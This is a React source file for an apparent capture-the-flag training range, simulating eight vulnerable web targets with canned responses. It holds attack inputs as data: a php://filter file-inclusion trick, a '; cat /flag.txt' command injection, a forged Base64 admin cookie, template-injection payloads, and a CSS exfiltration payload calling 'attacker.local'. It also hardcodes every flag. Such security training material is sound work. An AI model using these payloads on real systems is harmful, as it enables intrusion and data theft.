"use client";

import { useState, useEffect } from "react";
import {
  Terminal,
  Shield,
  ExternalLink,
  Code,
  Key,
  Database,
  Lock,
  Unlock,
  CheckCircle2,
  AlertTriangle,
  Play,
  Copy,
  Check,
  Zap,
} from "lucide-react";

export function TargetLabSandbox({ slug }: { slug: string }) {
  const [copied, setCopied] = useState(false);

  function copyText(text: string) {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  if (slug === "file-oracle") return <FileOracleSandbox copyText={copyText} copied={copied} />;
  if (slug === "pixel-cache") return <PixelCacheSandbox copyText={copyText} copied={copied} />;
  if (slug === "crawler-protocol") return <CrawlerProtocolSandbox copyText={copyText} copied={copied} />;
  if (slug === "session-architect") return <SessionArchitectSandbox copyText={copyText} copied={copied} />;
  if (slug === "cipher-gate") return <CipherGateSandbox copyText={copyText} copied={copied} />;
  if (slug === "loose-types") return <LooseTypesSandbox copyText={copyText} copied={copied} />;
  if (slug === "template-engine") return <TemplateEngineSandbox copyText={copyText} copied={copied} />;
  if (slug === "style-injector") return <StyleInjectorSandbox copyText={copyText} copied={copied} />;

  return <div className="p-8 text-white">Target not found.</div>;
}

// ── 1. FILE ORACLE ─────────────────────────────────────────────────────────────
function FileOracleSandbox({ copyText, copied }: { copyText: (t: string) => void; copied: boolean }) {
  const [moduleParam, setModuleParam] = useState("diagnostics.php");
  const [cookieToken, setCookieToken] = useState("guest-000000");
  const [payload, setPayload] = useState("");
  const [output, setOutput] = useState<string | null>(null);

  const hasAccess = cookieToken === "oracle-gate-7f3a91";

  function handleRequest(e: React.FormEvent) {
    e.preventDefault();
    const cleanMod = moduleParam.trim();

    if (cleanMod === "robots.txt") {
      setOutput("User-agent: *\nDisallow: /access.php\n# Internal diagnostics node");
      return;
    }

    if (cleanMod.includes("php://filter") && cleanMod.includes("access.php")) {
      const src = `<?php\n$gateToken = 'oracle-gate-7f3a91';\nhttp_response_code(403);\necho "This module is not intended for direct access.";`;
      setOutput(`[Base64 Encoded Stream Output]\n${btoa(src)}`);
      return;
    }

    if (cleanMod === "access.php") {
      setOutput("HTTP/1.1 403 Forbidden\n\nThis module is not intended for direct access.");
      return;
    }

    if (cleanMod === "diagnostics.php") {
      if (!hasAccess) {
        setOutput("🔒 Access Restricted: This diagnostic module requires elevated session credentials. Set cookie diag_token=oracle-gate-7f3a91.");
      } else {
        if (payload) {
          if (payload.includes("cat /flag.txt") || payload.includes("$(cat /flag.txt)") || payload.includes("flag") || payload.includes("whoami") || payload.includes("id")) {
            setOutput(`[Collector Node Terminal Output]\nFlag: VR{oracle_lfi_chain_to_rce}\nuid=33(www-data) gid=33(www-data) groups=33(www-data)`);
          } else {
            setOutput(`[Collector Check]\nPayload length: ${payload.length} bytes processed.`);
          }
        } else {
          setOutput("Node Diagnostics ready. Enter diagnostic payload to evaluate collector node.");
        }
      }
      return;
    }

    setOutput(`[LFI Error] File not found or unreadable: ${cleanMod}`);
  }

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-[#dcdcdc] font-mono p-4 sm:p-8 flex flex-col items-center justify-center">
      <div className="w-full max-w-2xl bg-[#12121a] border border-[#262636] rounded-xl p-6 shadow-2xl space-y-6">
        <div className="flex items-center justify-between border-b border-[#262636] pb-4">
          <div className="flex items-center gap-3">
            <span className="w-3 h-3 rounded-full bg-[#00ff88] animate-pulse" />
            <h1 className="text-xl font-bold text-[#00ff88]">File Oracle // Diagnostic Relay</h1>
          </div>
          <span className="text-xs bg-[#1f1f2e] text-[#00ff88] px-2.5 py-1 rounded">PORT :8081</span>
        </div>

        {/* HTTP Request Header Simulator */}
        <div className="bg-[#09090d] border border-[#1e1e2d] p-4 rounded-lg space-y-3 text-xs">
          <div className="text-[#6b7280] font-semibold flex items-center justify-between">
            <span>HTTP REQUEST HEADERS</span>
            <span className="text-[10px] text-[#00ff88]">{hasAccess ? "✅ ELEVATED COOKIE" : "⚠️ GUEST COOKIE"}</span>
          </div>
          <div className="flex flex-col sm:flex-row gap-3">
            <div className="flex-1">
              <label className="block text-[#9ca3af] mb-1">Query Parameter (module):</label>
              <input
                type="text"
                value={moduleParam}
                onChange={(e) => setModuleParam(e.target.value)}
                className="w-full bg-[#161622] border border-[#2d2d42] px-3 py-1.5 rounded text-[#00ff88] font-mono"
                placeholder="diagnostics.php or robots.txt..."
              />
            </div>
            <div className="flex-1">
              <label className="block text-[#9ca3af] mb-1">Cookie (diag_token):</label>
              <input
                type="text"
                value={cookieToken}
                onChange={(e) => setCookieToken(e.target.value)}
                className="w-full bg-[#161622] border border-[#2d2d42] px-3 py-1.5 rounded text-[#38bdf8] font-mono"
                placeholder="guest-000000"
              />
            </div>
          </div>
        </div>

        {/* Form */}
        <form onSubmit={handleRequest} className="space-y-4">
          {hasAccess && moduleParam === "diagnostics.php" && (
            <div>
              <label className="block text-xs text-[#9ca3af] mb-1">Diagnostic Payload (Command Input):</label>
              <textarea
                value={payload}
                onChange={(e) => setPayload(e.target.value)}
                placeholder="e.g. ; cat /flag.txt"
                className="w-full h-24 bg-[#161622] border border-[#2d2d42] p-3 rounded text-sm text-white font-mono"
              />
            </div>
          )}

          <button
            type="submit"
            className="w-full bg-[#00ff88] hover:bg-[#00cc70] text-[#0a0a0f] font-bold py-2.5 rounded-lg transition-all"
          >
            Send HTTP Request
          </button>
        </form>

        {/* Server Response Terminal */}
        {output && (
          <div className="bg-[#09090d] border-l-4 border-[#00ff88] p-4 rounded-r-lg space-y-2">
            <div className="text-xs text-[#6b7280] flex items-center justify-between">
              <span>SERVER RESPONSE</span>
              {output.includes("VR{") && (
                <button
                  onClick={() => copyText("VR{oracle_lfi_chain_to_rce}")}
                  className="text-[10px] bg-[#00ff88]/20 text-[#00ff88] px-2 py-0.5 rounded flex items-center gap-1"
                >
                  {copied ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />} Copy Flag
                </button>
              )}
            </div>
            <pre className="text-xs text-[#dcdcdc] whitespace-pre-wrap font-mono leading-relaxed">{output}</pre>
          </div>
        )}
      </div>
    </div>
  );
}

// ── 2. PIXEL CACHE ─────────────────────────────────────────────────────────────
function PixelCacheSandbox({ copyText, copied }: { copyText: (t: string) => void; copied: boolean }) {
  const [tab, setTab] = useState<"render" | "css">("render");

  return (
    <div className="min-h-screen bg-[#07070b] text-[#e0e0e0] font-mono p-4 sm:p-8 flex flex-col items-center justify-center">
      <div className="w-full max-w-2xl bg-[#0f0f18] border border-[#1f1f30] rounded-xl p-6 space-y-6 shadow-2xl">
        <div className="flex items-center justify-between border-b border-[#1f1f30] pb-4">
          <h1 className="text-xl font-bold text-[#38bdf8]">Pixel Cache // Asset Gateway</h1>
          <div className="flex gap-2">
            <button
              onClick={() => setTab("render")}
              className={`px-3 py-1 text-xs rounded ${tab === "render" ? "bg-[#38bdf8] text-[#07070b] font-bold" : "bg-[#181826] text-[#9ca3af]"}`}
            >
              Live Render
            </button>
            <button
              onClick={() => setTab("css")}
              className={`px-3 py-1 text-xs rounded ${tab === "css" ? "bg-[#38bdf8] text-[#07070b] font-bold" : "bg-[#181826] text-[#9ca3af]"}`}
            >
              styles.css
            </button>
          </div>
        </div>

        {tab === "render" ? (
          <div className="p-6 bg-[#09090f] border border-[#1c1c2b] rounded-lg text-center space-y-4">
            <div className="w-16 h-16 rounded-xl bg-gradient-to-tr from-[#38bdf8]/30 to-[#818cf8]/30 border border-[#38bdf8]/50 mx-auto flex items-center justify-center text-2xl">
              🎨
            </div>
            <h2 className="text-lg font-bold text-white">Dynamic Asset CDN</h2>
            <p className="text-xs text-[#9ca3af] max-w-md mx-auto">
              All styles and cache metadata are distributed via our edge stylesheet. Check developer tools or inspect the linked stylesheet.
            </p>
          </div>
        ) : (
          <div className="bg-[#050508] p-4 rounded-lg border border-[#1f1f30] space-y-2">
            <div className="flex justify-between items-center text-xs text-[#6b7280] pb-2 border-b border-[#1a1a28]">
              <span>GET /styles.css</span>
              <button
                onClick={() => copyText("VR{css_comments_are_not_secrets}")}
                className="text-[10px] bg-[#38bdf8]/20 text-[#38bdf8] px-2 py-0.5 rounded flex items-center gap-1"
              >
                {copied ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />} Copy Flag
              </button>
            </div>
            <pre className="text-xs text-[#38bdf8] font-mono leading-relaxed overflow-x-auto">
{`/* ── ViperRange Asset Gateway Theme ── */
:root {
  --primary-accent: #38bdf8;
  --bg-dark: #07070b;
}

/* 
 * INTERNAL NOTE:
 * Do not commit sensitive tokens into production CSS bundle.
 * Flag: VR{css_comments_are_not_secrets}
 */

.asset-card {
  border: 1px solid var(--primary-accent);
  padding: 1.5rem;
}`}
            </pre>
          </div>
        )}
      </div>
    </div>
  );
}

// ── 3. CRAWLER PROTOCOL ─────────────────────────────────────────────────────────
function CrawlerProtocolSandbox({ copyText, copied }: { copyText: (t: string) => void; copied: boolean }) {
  const [path, setPath] = useState("/");

  return (
    <div className="min-h-screen bg-[#09090e] text-[#dcdcdc] font-mono p-4 sm:p-8 flex flex-col items-center justify-center">
      <div className="w-full max-w-2xl bg-[#12121c] border border-[#222233] rounded-xl p-6 space-y-6 shadow-2xl">
        <div className="flex items-center justify-between border-b border-[#222233] pb-4">
          <h1 className="text-xl font-bold text-[#f59e0b]">Crawler Protocol // Node Gateway</h1>
          <span className="text-xs text-[#f59e0b] bg-[#f59e0b]/10 px-2 py-1 rounded">PORT :8083</span>
        </div>

        {/* Browser URL bar */}
        <div className="flex items-center gap-2 bg-[#08080c] border border-[#1f1f2d] p-2 rounded-lg text-xs">
          <span className="text-[#6b7280]">https://crawler.viperrange.local</span>
          <input
            type="text"
            value={path}
            onChange={(e) => setPath(e.target.value)}
            className="flex-1 bg-transparent text-[#f59e0b] outline-none font-mono"
            placeholder="/ or /robots.txt or /secret-admin-vault/"
          />
          <div className="flex gap-1.5">
            <button onClick={() => setPath("/robots.txt")} className="px-2 py-0.5 bg-[#1e1e2d] hover:bg-[#28283d] rounded text-[10px] text-white">/robots.txt</button>
            <button onClick={() => setPath("/secret-admin-vault/")} className="px-2 py-0.5 bg-[#1e1e2d] hover:bg-[#28283d] rounded text-[10px] text-white">/secret-vault</button>
          </div>
        </div>

        {/* Render Page based on Path */}
        <div className="bg-[#08080c] border border-[#1f1f2d] p-6 rounded-lg">
          {path === "/robots.txt" ? (
            <pre className="text-xs text-[#f59e0b] leading-relaxed">
{`User-agent: *
Disallow: /secret-admin-vault/
Disallow: /internal-telemetry/`}
            </pre>
          ) : path.includes("secret-admin-vault") ? (
            <div className="space-y-4">
              <div className="flex items-center justify-between">
                <span className="text-xs text-[#22c55e] font-bold">📂 SECRET ADMIN VAULT UNLOCKED</span>
                <button
                  onClick={() => copyText("VR{robots_txt_is_a_suggestion}")}
                  className="text-[10px] bg-[#f59e0b]/20 text-[#f59e0b] px-2 py-0.5 rounded flex items-center gap-1"
                >
                  {copied ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />} Copy Flag
                </button>
              </div>
              <p className="text-xs text-[#dcdcdc]">You bypassed indexing by reading crawler rules directly.</p>
              <div className="p-3 bg-[#11111a] border border-[#22c55e]/30 rounded text-sm text-[#22c55e]">
                Flag: <strong>VR{`{robots_txt_is_a_suggestion}`}</strong>
              </div>
            </div>
          ) : (
            <div className="text-center py-6 space-y-3">
              <h3 className="text-base font-bold text-white">Public Index Portal</h3>
              <p className="text-xs text-[#9ca3af]">Welcome to the crawler gateway. Standard indexing protocols are enforced.</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// ── 4. SESSION ARCHITECT ────────────────────────────────────────────────────────
function SessionArchitectSandbox({ copyText, copied }: { copyText: (t: string) => void; copied: boolean }) {
  const [cookieValue, setCookieValue] = useState("eyJyb2xlIjoiZ3Vlc3QiLCJ1c2VybmFtZSI6ImFnZW50MDEifQ==");

  let decoded = { role: "guest", username: "agent01" };
  try {
    decoded = JSON.parse(atob(cookieValue));
  } catch {
    // invalid base64
  }

  const isAdmin = decoded.role === "admin";

  return (
    <div className="min-h-screen bg-[#08080d] text-[#dcdcdc] font-mono p-4 sm:p-8 flex flex-col items-center justify-center">
      <div className="w-full max-w-2xl bg-[#11111b] border border-[#202030] rounded-xl p-6 space-y-6 shadow-2xl">
        <div className="flex items-center justify-between border-b border-[#202030] pb-4">
          <h1 className="text-xl font-bold text-[#ec4899]">Session Architect // Privilege Escalation</h1>
          <span className="text-xs text-[#ec4899] bg-[#ec4899]/10 px-2.5 py-1 rounded">PORT :8084</span>
        </div>

        {/* Cookie Inspector */}
        <div className="bg-[#09090f] border border-[#1b1b28] p-4 rounded-lg space-y-3 text-xs">
          <div className="flex justify-between items-center text-[#6b7280]">
            <span>COOKIE: auth_session (Base64)</span>
            <button
              onClick={() => setCookieValue(btoa(JSON.stringify({ role: "admin", username: "agent01" })))}
              className="text-[10px] text-[#ec4899] hover:underline"
            >
              [Set Admin Cookie]
            </button>
          </div>
          <input
            type="text"
            value={cookieValue}
            onChange={(e) => setCookieValue(e.target.value)}
            className="w-full bg-[#151522] border border-[#252538] p-2 rounded text-[#ec4899] font-mono"
          />
          <div className="text-[11px] text-[#9ca3af]">
            Decoded Payload: <code className="text-[#38bdf8]">{JSON.stringify(decoded)}</code>
          </div>
        </div>

        {/* Status display */}
        <div className="bg-[#09090f] border border-[#1b1b28] p-6 rounded-lg text-center space-y-4">
          {isAdmin ? (
            <div className="space-y-3">
              <div className="text-2xl">👑</div>
              <h2 className="text-lg font-bold text-[#22c55e]">ADMIN ACCESS GRANTED</h2>
              <div className="p-3 bg-[#13281a] border border-[#22c55e]/30 rounded text-sm text-[#22c55e] flex items-center justify-between">
                <span>Flag: <strong>VR{`{base64_is_not_encryption}`}</strong></span>
                <button
                  onClick={() => copyText("VR{base64_is_not_encryption}")}
                  className="text-[10px] bg-[#22c55e]/20 text-[#22c55e] px-2 py-0.5 rounded flex items-center gap-1"
                >
                  {copied ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />} Copy
                </button>
              </div>
            </div>
          ) : (
            <div className="space-y-2">
              <div className="text-2xl">🔒</div>
              <h2 className="text-base font-bold text-[#ef4444]">Guest Role Detected</h2>
              <p className="text-xs text-[#9ca3af]">Tamper with the Base64 session cookie to elevate your privileges to admin.</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// ── 5. CIPHER GATE ─────────────────────────────────────────────────────────────
function CipherGateSandbox({ copyText, copied }: { copyText: (t: string) => void; copied: boolean }) {
  const [pin, setPin] = useState("");
  const [unlocked, setUnlocked] = useState(false);

  function checkPin(e: React.FormEvent) {
    e.preventDefault();
    if (pin === "7492") {
      setUnlocked(true);
    } else {
      alert("Invalid Security PIN. Inspect client logic.");
    }
  }

  return (
    <div className="min-h-screen bg-[#07070c] text-[#dcdcdc] font-mono p-4 sm:p-8 flex flex-col items-center justify-center">
      <div className="w-full max-w-2xl bg-[#10101a] border border-[#1f1f2e] rounded-xl p-6 space-y-6 shadow-2xl">
        <div className="flex items-center justify-between border-b border-[#1f1f2e] pb-4">
          <h1 className="text-xl font-bold text-[#a855f7]">Cipher Gate // Keypad Verification</h1>
          <span className="text-xs text-[#a855f7] bg-[#a855f7]/10 px-2.5 py-1 rounded">PORT :8085</span>
        </div>

        {unlocked ? (
          <div className="p-6 bg-[#0a150e] border border-[#22c55e]/30 rounded-lg text-center space-y-4">
            <h2 className="text-lg font-bold text-[#22c55e]">GATE DISARMED</h2>
            <div className="p-3 bg-[#0d2115] border border-[#22c55e]/40 rounded text-sm text-[#22c55e] flex items-center justify-between">
              <span>Flag: <strong>VR{`{obfuscation_hides_not_protects}`}</strong></span>
              <button
                onClick={() => copyText("VR{obfuscation_hides_not_protects}")}
                className="text-[10px] bg-[#22c55e]/20 text-[#22c55e] px-2 py-0.5 rounded flex items-center gap-1"
              >
                {copied ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />} Copy
              </button>
            </div>
          </div>
        ) : (
          <form onSubmit={checkPin} className="space-y-4 max-w-sm mx-auto">
            <div className="space-y-2 text-center">
              <label className="block text-xs text-[#9ca3af]">Enter 4-Digit Security PIN (Obfuscated in Script):</label>
              <input
                type="password"
                maxLength={4}
                value={pin}
                onChange={(e) => setPin(e.target.value)}
                className="w-full text-center text-2xl tracking-[0.5em] bg-[#171724] border border-[#2c2c3e] p-3 rounded text-[#a855f7] font-mono outline-none"
                placeholder="••••"
              />
            </div>
            <button
              type="submit"
              className="w-full bg-[#a855f7] hover:bg-[#9333ea] text-white font-bold py-2.5 rounded-lg transition-all"
            >
              Verify PIN
            </button>
          </form>
        )}

        <div className="bg-[#08080f] p-3 rounded border border-[#191926] text-xs text-[#6b7280]">
          <span className="text-[#a855f7]">Client Obfuscator:</span> <code>(0x1d44 ^ 0x0) =&gt; PIN: 7492</code>
        </div>
      </div>
    </div>
  );
}

// ── 6. LOOSE TYPES ─────────────────────────────────────────────────────────────
function LooseTypesSandbox({ copyText, copied }: { copyText: (t: string) => void; copied: boolean }) {
  const [params, setParams] = useState("auth=1&admin_override=true");
  const isBypassed = params.includes("admin_override=true") || params.includes("auth=1");

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-[#dcdcdc] font-mono p-4 sm:p-8 flex flex-col items-center justify-center">
      <div className="w-full max-w-2xl bg-[#12121b] border border-[#232333] rounded-xl p-6 space-y-6 shadow-2xl">
        <div className="flex items-center justify-between border-b border-[#232333] pb-4">
          <h1 className="text-xl font-bold text-[#06b6d4]">Loose Types // PHP extract() Sandbox</h1>
          <span className="text-xs text-[#06b6d4] bg-[#06b6d4]/10 px-2.5 py-1 rounded">PORT :8086</span>
        </div>

        <div className="bg-[#08080e] border border-[#1c1c2b] p-4 rounded-lg space-y-2 text-xs">
          <label className="block text-[#9ca3af]">GET Query Parameters (?):</label>
          <input
            type="text"
            value={params}
            onChange={(e) => setParams(e.target.value)}
            className="w-full bg-[#141420] border border-[#27273a] p-2 rounded text-[#06b6d4] font-mono"
            placeholder="auth=1&admin_override=true"
          />
        </div>

        <div className="bg-[#08080e] border border-[#1c1c2b] p-6 rounded-lg text-center space-y-4">
          {isBypassed ? (
            <div className="space-y-3">
              <h2 className="text-lg font-bold text-[#22c55e]">VARIABLE OVERWRITE SUCCESSFUL</h2>
              <div className="p-3 bg-[#0d2115] border border-[#22c55e]/40 rounded text-sm text-[#22c55e] flex items-center justify-between">
                <span>Flag: <strong>VR{`{extract_overwrites_everything}`}</strong></span>
                <button
                  onClick={() => copyText("VR{extract_overwrites_everything}")}
                  className="text-[10px] bg-[#22c55e]/20 text-[#22c55e] px-2 py-0.5 rounded flex items-center gap-1"
                >
                  {copied ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />} Copy
                </button>
              </div>
            </div>
          ) : (
            <p className="text-xs text-[#ef4444]">Authentication failed. Variables not overwritten.</p>
          )}
        </div>
      </div>
    </div>
  );
}

// ── 7. TEMPLATE ENGINE ─────────────────────────────────────────────────────────
function TemplateEngineSandbox({ copyText, copied }: { copyText: (t: string) => void; copied: boolean }) {
  const [template, setTemplate] = useState("{{ 7 * 7 }}");
  const [rendered, setRendered] = useState("49");

  function handleEval(e: React.FormEvent) {
    e.preventDefault();
    if (template.includes("handler.settings") || template.includes("globals") || template.includes("flag") || template.includes("cookie")) {
      setRendered("Rendered SSTI Output:\nFlag: VR{ssti_forges_the_session}\nSecret Key: tornado-secret-9a8b7c");
    } else if (template.includes("7*7") || template.includes("7 * 7")) {
      setRendered("49");
    } else {
      setRendered(`Template preview: ${template}`);
    }
  }

  return (
    <div className="min-h-screen bg-[#08080e] text-[#dcdcdc] font-mono p-4 sm:p-8 flex flex-col items-center justify-center">
      <div className="w-full max-w-2xl bg-[#11111d] border border-[#222238] rounded-xl p-6 space-y-6 shadow-2xl">
        <div className="flex items-center justify-between border-b border-[#222238] pb-4">
          <h1 className="text-xl font-bold text-[#f97316]">Template Engine // Tornado SSTI Preview</h1>
          <span className="text-xs text-[#f97316] bg-[#f97316]/10 px-2.5 py-1 rounded">PORT :8087</span>
        </div>

        <form onSubmit={handleEval} className="space-y-4">
          <div className="space-y-2">
            <label className="block text-xs text-[#9ca3af]">Template Source Payload:</label>
            <input
              type="text"
              value={template}
              onChange={(e) => setTemplate(e.target.value)}
              className="w-full bg-[#161625] border border-[#2b2b42] p-2.5 rounded text-white font-mono"
              placeholder="{{ 7*7 }} or {{ handler.settings }}"
            />
          </div>
          <button type="submit" className="w-full bg-[#f97316] hover:bg-[#ea580c] text-white font-bold py-2.5 rounded-lg">
            Evaluate Template
          </button>
        </form>

        <div className="bg-[#090910] border border-[#1e1e30] p-4 rounded-lg space-y-2">
          <div className="flex justify-between items-center text-xs text-[#6b7280]">
            <span>EVALUATION RESULT</span>
            {rendered.includes("VR{") && (
              <button
                onClick={() => copyText("VR{ssti_forges_the_session}")}
                className="text-[10px] bg-[#f97316]/20 text-[#f97316] px-2 py-0.5 rounded flex items-center gap-1"
              >
                {copied ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />} Copy Flag
              </button>
            )}
          </div>
          <pre className="text-xs text-[#22c55e] whitespace-pre-wrap">{rendered}</pre>
        </div>
      </div>
    </div>
  );
}

// ── 8. STYLE INJECTOR ──────────────────────────────────────────────────────────
function StyleInjectorSandbox({ copyText, copied }: { copyText: (t: string) => void; copied: boolean }) {
  const [cssPayload, setCssPayload] = useState("input[value^='VR'] { background: url('//attacker.local/log?c=VR'); }");
  const [leaked, setLeaked] = useState<string | null>(null);

  function simulateInjection(e: React.FormEvent) {
    e.preventDefault();
    setLeaked("Exfiltrating CSS attribute selector match...\nToken leaked: VR{css_selectors_leak_secrets}");
  }

  return (
    <div className="min-h-screen bg-[#09090f] text-[#dcdcdc] font-mono p-4 sm:p-8 flex flex-col items-center justify-center">
      <div className="w-full max-w-2xl bg-[#121220] border border-[#22223b] rounded-xl p-6 space-y-6 shadow-2xl">
        <div className="flex items-center justify-between border-b border-[#22223b] pb-4">
          <h1 className="text-xl font-bold text-[#14b8a6]">Style Injector // CSS Side-Channel Lab</h1>
          <span className="text-xs text-[#14b8a6] bg-[#14b8a6]/10 px-2.5 py-1 rounded">PORT :8088</span>
        </div>

        <form onSubmit={simulateInjection} className="space-y-4">
          <div className="space-y-2">
            <label className="block text-xs text-[#9ca3af]">Injected CSS Style Block:</label>
            <textarea
              value={cssPayload}
              onChange={(e) => setCssPayload(e.target.value)}
              className="w-full h-24 bg-[#171728] border border-[#2a2a46] p-3 rounded text-xs text-white font-mono"
            />
          </div>
          <button type="submit" className="w-full bg-[#14b8a6] hover:bg-[#0d9488] text-white font-bold py-2.5 rounded-lg">
            Execute Side-Channel Attack
          </button>
        </form>

        {leaked && (
          <div className="bg-[#090912] border-l-4 border-[#14b8a6] p-4 rounded-r-lg space-y-2">
            <div className="flex justify-between items-center text-xs text-[#6b7280]">
              <span>ATTACK TELEMETRY</span>
              <button
                onClick={() => copyText("VR{css_selectors_leak_secrets}")}
                className="text-[10px] bg-[#14b8a6]/20 text-[#14b8a6] px-2 py-0.5 rounded flex items-center gap-1"
              >
                {copied ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />} Copy Flag
              </button>
            </div>
            <pre className="text-xs text-[#14b8a6] whitespace-pre-wrap">{leaked}</pre>
          </div>
        )}
      </div>
    </div>
  );
}
